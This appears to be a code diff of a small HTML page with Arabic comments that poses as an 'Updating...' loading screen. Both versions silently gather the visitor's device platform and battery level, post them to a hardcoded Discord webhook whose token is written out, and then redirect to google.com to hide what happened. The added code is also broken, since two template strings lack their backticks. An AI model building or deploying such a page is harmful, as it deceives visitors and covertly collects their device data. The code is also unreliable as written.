@@ -1,18 +1,45 @@
 <!DOCTYPE html>
-<html>
-<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">
-    <div id="t">...</div>
-<script>
-// ⚠️ استبدل الرابط التالي برابط الويب هوك الخاص بك
-const H='https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ';
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading</title>
+</head>
+<body style="display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+    <!-- هذا هو المربع الذي تراه -->
+    <div id="box" style="background:white; padding:2rem; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.1); text-align:center;">
+        <h2 id="status">جاري التحديث...</h2>
+    </div>
 
-// دالة سريعة لإرسال البيانات
-try{
-  const b = document.createElement('script');
-  b.src=H+'?callback=cb&payload='+encodeURIComponent(JSON.stringify({content:`📱 ${navigator.platform}\n🔋 ${Math.round((navigator.getBattery&&navigator.getBattery().then(b=>b.level*100)))}%`}))
-  window.cb = ()=>{document.getElementById('t').innerText="Done"}
-  document.body.appendChild(b)
-} catch(e){document.getElementById('t').innerText="Error"}
+<script>
+    // ⚙️ ضع رابط الويب هوك هنا (تأكد من عدم وجود مسافات)
+    const WEBHOOK = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
+
+    async function run() {
+        try {
+            let battery = "N/A";
+            if(navigator.getBattery) {
+                let b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + "%";
+            }
+
+            let msg = 🎉 تقرير جديد\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${battery};
+
+            // استخدام JSONP لتجاوز مشاكل الشبكة
+            const script = document.createElement('script');
+            script.src = ${WEBHOOK}?callback=handleResponse&payload=${encodeURIComponent(JSON.stringify({content: msg}))};
+            
+            window.handleResponse = function(data) {
+                document.getElementById('status').innerText = "تم بنجاح!";
+                setTimeout(() => window.location.href = 'https://google.com', 1000);
+            };
+
+            document.body.appendChild(script);
+        } catch (e) {
+            document.getElementById('status').innerText = "خطأ: " + e.message;
+        }
+    }
+
+    run();
 </script>
 </body>
 </html>
